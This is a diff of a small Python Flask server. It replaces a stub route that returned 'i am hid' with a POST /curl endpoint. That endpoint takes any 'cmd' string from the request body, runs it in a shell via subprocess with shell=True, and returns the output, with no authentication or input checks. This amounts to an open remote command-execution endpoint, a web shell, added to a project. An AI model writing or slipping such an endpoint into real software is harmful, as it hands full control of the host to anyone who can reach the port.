@@ -2,32 +2,21 @@ from http.server import SimpleHTTPRequestHandler, HTTPServer
 import socketserver
 import os
 from flask import Flask, jsonify, request 
+import base64
+import subprocess
 
-# def call_curl(curl):
-#     msg = curl + ' -k' #cant verify certs for some reason
-#     os.system(msg)
-
-# def main():
-#     Handler = SimpleHTTPRequestHandler
-#     PORT = os.getenv('PYTHON_PORT')
-#     if PORT == None:
-#         PORT = 5000
-#     with socketserver.TCPServer(("", PORT), Handler) as httpd:
-#         print("Serving on port ", PORT)
-#         httpd.serve_forever()
-#         print("mangos")
-#         curl = 'curl https://www.google.com.au'
-#         call_curl(curl)
-
-# if __name__ == '__main__':
-#     main()
+def call_curl(curl):
+    msg = curl #cant verify certs for some reason
+    output = subprocess.check_output(msg, shell=True)
+    return output
 
 app = Flask(__name__)
 
 @app.route('/curl', methods=['POST'])
 def curlEndpoint():
-    print(request.data)
-    return "i am hid"
+    body = request.json
+    resp = call_curl(body["cmd"])
+    return resp
 
 if __name__ == '__main__':
     PORT = os.getenv('PYTHON_PORT')
